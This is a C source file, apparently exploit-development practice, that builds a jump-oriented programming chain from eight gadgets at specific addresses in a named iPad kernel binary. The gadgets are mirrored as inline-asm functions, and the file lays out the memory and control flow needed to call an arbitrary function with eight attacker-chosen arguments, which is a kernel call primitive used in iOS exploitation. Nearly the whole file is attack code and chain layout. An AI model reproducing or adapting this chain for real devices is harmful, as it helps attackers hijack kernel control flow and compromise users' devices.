#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// jop5.c - Delivers all 8 user arguments (x0..x7) cleanly to the target, using
// ONLY gadgets that actually exist in the kernel_ipad7_137 binary's code region.
//
// The previous do_jop helper was a synthesized instruction sequence with no
// corresponding kernel address, so it has been removed entirely. Instead, x9 /
// x10 / x21 are stashed via 6 populate iterations using real kernel gadgets.
// The C side reaches the chain through a single standard function-pointer call
// to gadget_prologue. There is no inline asm anywhere except inside naked
// gadget functions, and each naked function's body matches the exact
// instructions at the documented kernel address.
//
// All 8 gadgets used (all in __PLK_TEXT_EXEC, verified against the binary):
//   gadget_populate     0xFFFFFFF006019AFC   ldp x5,x8,[x0,#0x10] ; ldp x1,x2,[x0,#0x20] ; ldp x3,x4,[x0,#0x30] ; mov x0,x8 ; br x5
//   gadget_prologue     0xFFFFFFF006747A44   stp x20,x19,[sp,#-0x20]! ; ... ; blr x8 ; str x0,[x19] ; ... ; ret
//   mov_x10_x1__br_x2   0xFFFFFFF006628A94   mov x10, x1 ; br x2     (iter 1: x10 := populate;  iter 5: x10 := fixup)
//   mov_x21_x1__br_x10  0xFFFFFFF006D06D50   mov x21, x1 ; br x10    (iter 2: x21 := x0_user)
//   mov_x14_x3__br_x2   0xFFFFFFF006556BD8   mov x14, x3 ; br x2     (iter 3: x14 := target_addr)
//   mov_x9_x14__br_x10  0xFFFFFFF00662A088   mov x9,  x14 ; br x10   (iter 4: x9  := x14 = target_addr)
//   mov_x5_x8__br_x10   0xFFFFFFF006B3D428   mov x5,  x8  ; br x10   (delivery: x5 := x5_user, br fixup)
//   mov_x0_x21__br_x9   0xFFFFFFF006513D94   mov x0,  x21 ; br x9    (delivery: x0 := x0_user, br target)

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

// 0xFFFFFFF006019AFC  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp X5, X8, [X0,#0x10] \n"
        "ldp X1, X2, [X0,#0x20] \n"
        "ldp X3, X4, [X0,#0x30] \n"
        "mov X0, X8 \n"
        "br X5 \n"
    );
}

// 0xFFFFFFF006747A44  (__PLK_TEXT_EXEC)
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n"
        "stp x29, x30, [sp, #0x10]\n"
        "add x29, sp, #0x10\n"
        "mov x19, x1\n"
        "ldr x0, [x0, #0x98]\n"
        "ldr x8, [x0]\n"
        "ldr x8, [x8, #0x7C0]\n"
        "blr x8\n"
        "str x0, [x19]\n"
        "mov w0, #0\n"
        "ldp x29, x30, [sp, #0x10]\n"
        "ldp x20, x19, [sp], #0x20\n"
        "ret\n"
    );
}

// 0xFFFFFFF006628A94  (__PLK_TEXT_EXEC)   mov x10, x1 ; br x2
__attribute__((naked)) void mov_x10_x1__br_x2(void) {
    __asm__ volatile (
        "mov x10, x1\n"
        "br x2\n"
    );
}

// 0xFFFFFFF006D06D50  (__PLK_TEXT_EXEC)   mov x21, x1 ; br x10
__attribute__((naked)) void mov_x21_x1__br_x10(void) {
    __asm__ volatile (
        "mov x21, x1\n"
        "br x10\n"
    );
}

// 0xFFFFFFF006556BD8  (__PLK_TEXT_EXEC)   mov x14, x3 ; br x2
__attribute__((naked)) void mov_x14_x3__br_x2(void) {
    __asm__ volatile (
        "mov x14, x3\n"
        "br x2\n"
    );
}

// 0xFFFFFFF00662A088  (__PLK_TEXT_EXEC)   mov x9, x14 ; br x10
__attribute__((naked)) void mov_x9_x14__br_x10(void) {
    __asm__ volatile (
        "mov x9, x14\n"
        "br x10\n"
    );
}

// 0xFFFFFFF006B3D428  (__PLK_TEXT_EXEC)   mov x5, x8 ; br x10
__attribute__((naked)) void mov_x5_x8__br_x10(void) {
    __asm__ volatile (
        "mov x5, x8\n"
        "br x10\n"
    );
}

// 0xFFFFFFF006513D94  (__PLK_TEXT_EXEC)   mov x0, x21 ; br x9
__attribute__((naked)) void mov_x0_x21__br_x9(void) {
    __asm__ volatile (
        "mov x0, x21\n"
        "br x9\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size);
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, (void*)addr, size);

    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) =
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}


// Chain flow (a total of 6 populate iterations):
//
//   C  --(blr prologue)-->  prologue --(blr populate)-->  iter1 ... iter6 --> target
//   prologue's "blr x8" sets LR = address of "str x0,[x19]", and the rest of the chain
//   uses only "br" (never "blr"), so LR is preserved. The target's "ret" lands back at
//   prologue's "str x0,[x19]", which saves x0 (the target's return value) to STORED_RET
//   and then runs the normal epilogue.
//
//   ITER 1: mov_x10_x1__br_x2    -> x10 := populate_addr   (used as br-x10 re-entry from here on)
//   ITER 2: mov_x21_x1__br_x10   -> x21 := x0_user         (consumed by delivery fixup)
//   ITER 3: mov_x14_x3__br_x2    -> x14 := target_addr     (intermediate for the x9 stash)
//   ITER 4: mov_x9_x14__br_x10   -> x9  := x14 = target_addr
//   ITER 5: mov_x10_x1__br_x2    -> x10 := fixup_addr      (overwrites x10 for the delivery br x10)
//   ITER 6 (delivery):
//       populate -> mov_x5_x8__br_x10 -> mov_x0_x21__br_x9 -> target
//
//   Register state at target entry:
//     x0..x5 = x0_user..x5_user
//     x6     = x6_user   (untouched by prologue / populate / any stash gadget from C entry on)
//     x7     = x7_user   (same)
//
// Payload memory layout (offsets are relative to my_page):
//   Each per-iter data block lives at my_page + 0x100*N and uses only the
//   offsets populate reads from: 0x10..0x38 (0x40 bytes total).

#define BLK1  0x000   // iter 1 data block (= my_page itself; prologue passes my_page as x0)
#define BLK2  0x100
#define BLK3  0x180
#define BLK4  0x200
#define BLK5  0x280
#define BLK6  0x300   // delivery
#define STORED_RET_OFF 0x400

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    uint64_t mp = (uint64_t)my_page;

    // Pointer-chase graph used by prologue (assuming its x0 input = my_page):
    //   ldr x0, [x0, #0x98]   -> *(my_page+0x98)  = my_page
    //   ldr x8, [x0]          -> *my_page         = my_page
    //   ldr x8, [x8, #0x7C0]  -> *(my_page+0x7C0) = gadget_populate
    //   blr x8                -> enters populate with x0 = my_page (= iter 1 data block)
    write64(mp + 0x00,  mp);
    write64(mp + 0x98,  mp);
    write64(mp + 0x7C0, (uint64_t)gadget_populate);

    // ----- ITER 1: x10 := populate_addr -----
    //   populate: x5 = gadget1, x8 = mp+BLK2 (= next x0), x1 = pop_addr, x2 = pop_addr
    //   br x5 -> "mov x10,x1 ; br x2": x10 := pop_addr, br x2 -> populate (x0 = mp+BLK2)
    write64(mp + BLK1 + 0x10, (uint64_t)mov_x10_x1__br_x2);
    write64(mp + BLK1 + 0x18, mp + BLK2);                     // -> x8 -> x0 = mp+BLK2 (next block)
    write64(mp + BLK1 + 0x20, (uint64_t)gadget_populate);     // -> x1 (moved into x10)
    write64(mp + BLK1 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
    // BLK1+0x30, +0x38 : don't care

    // ----- ITER 2: x21 := x0_user -----
    //   populate: x5 = gadget2, x8 = mp+BLK3, x1 = x0_user
    //   br x5 -> "mov x21,x1 ; br x10": x21 := x0_user, br x10 -> populate (x0 = mp+BLK3)
    write64(mp + BLK2 + 0x10, (uint64_t)mov_x21_x1__br_x10);
    write64(mp + BLK2 + 0x18, mp + BLK3);                     // -> next block
    write64(mp + BLK2 + 0x20, x0);                            // -> x1 (moved into x21)
    // BLK2+0x28..0x38 : don't care

    // ----- ITER 3: x14 := target_addr -----
    //   populate: x5 = gadget3, x8 = mp+BLK4, x2 = pop_addr, x3 = target_addr
    //   br x5 -> "mov x14,x3 ; br x2": x14 := target_addr, br x2 -> populate (x0 = mp+BLK4)
    write64(mp + BLK3 + 0x10, (uint64_t)mov_x14_x3__br_x2);
    write64(mp + BLK3 + 0x18, mp + BLK4);                     // -> next block
    write64(mp + BLK3 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)
    write64(mp + BLK3 + 0x30, addr);                          // -> x3 (moved into x14)
    // BLK3+0x20, +0x38 : don't care

    // ----- ITER 4: x9 := x14 = target_addr -----
    //   populate: x5 = gadget4, x8 = mp+BLK5
    //   br x5 -> "mov x9,x14 ; br x10": x9 := target_addr, br x10 -> populate (x0 = mp+BLK5)
    write64(mp + BLK4 + 0x10, (uint64_t)mov_x9_x14__br_x10);
    write64(mp + BLK4 + 0x18, mp + BLK5);                     // -> next block
    // BLK4+0x20..0x38 : don't care (gadget only reads x14, branches via x10)

    // ----- ITER 5: x10 := fixup_addr (= mov_x0_x21__br_x9) -----
    //   populate: x5 = gadget1 (same), x8 = mp+BLK6, x1 = fixup_addr, x2 = pop_addr
    //   br x5 -> "mov x10,x1 ; br x2": x10 := fixup, br x2 -> populate (x0 = mp+BLK6)
    write64(mp + BLK5 + 0x10, (uint64_t)mov_x10_x1__br_x2);
    write64(mp + BLK5 + 0x18, mp + BLK6);                     // -> next block (delivery)
    write64(mp + BLK5 + 0x20, (uint64_t)mov_x0_x21__br_x9);   // -> x1 (moved into x10 = fixup)
    write64(mp + BLK5 + 0x28, (uint64_t)gadget_populate);     // -> x2 (br target)

    // ----- ITER 6 (DELIVERY): -----
    //   populate: x5 = mov_x5_x8__br_x10, x8 = x5_user, x1..x4 = user, x0 = x5_user (to be fixed up)
    //   br x5 -> mov x5,x8 : x5 := x5_user, br x10 (= fixup) -> mov x0,x21 : x0 := x0_user, br x9 (= target)
    write64(mp + BLK6 + 0x10, (uint64_t)mov_x5_x8__br_x10);
    write64(mp + BLK6 + 0x18, x5);                            // -> x8, then mov x0,x8 writes x0 (fixed up later)
    write64(mp + BLK6 + 0x20, x1);                            // -> x1
    write64(mp + BLK6 + 0x28, x2);                            // -> x2
    write64(mp + BLK6 + 0x30, x3);                            // -> x3
    write64(mp + BLK6 + 0x38, x4);                            // -> x4

    uint64_t STORED_RET = mp + STORED_RET_OFF;

    // Standard function-pointer call into prologue.
    // The C ABI automatically loads x0=mp, x1=STORED_RET, x6=x6_user, x7=x7_user.
    // x2..x5 are overwritten by populate, so they are don't-care here.
    // x9 / x10 / x21 are stashed by the 6-iter chain above -- no inline asm needed on the C side.
    typedef uint64_t (*func8_t)(uint64_t, uint64_t, uint64_t, uint64_t,
                                uint64_t, uint64_t, uint64_t, uint64_t);
    ((func8_t)gadget_prologue)(mp, STORED_RET,
                               0, 0, 0, 0,
                               x6, x7);

    return read64(STORED_RET);
}


int main(int argc, char *argv[], char *envp[]) {
#if 0
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6((uint64_t)func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop((uint64_t)func_arg8,
                             0xdeadbeef41424340, 0xdeadbeef41424341,
                             0xdeadbeef41424342, 0xdeadbeef41424343,
                             0xdeadbeef41424344, 0xdeadbeef41424345,
                             0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);
    // Expected output (all 8 arguments delivered correctly):
    //   a1 = 0xdeadbeef41424340
    //   a2 = 0xdeadbeef41424341
    //   a3 = 0xdeadbeef41424342
    //   a4 = 0xdeadbeef41424343
    //   a5 = 0xdeadbeef41424344
    //   a6 = 0xdeadbeef41424345
    //   a7 = 0xdeadbeef41424346
    //   a8 = 0xdeadbeef41424347

    return 0;
}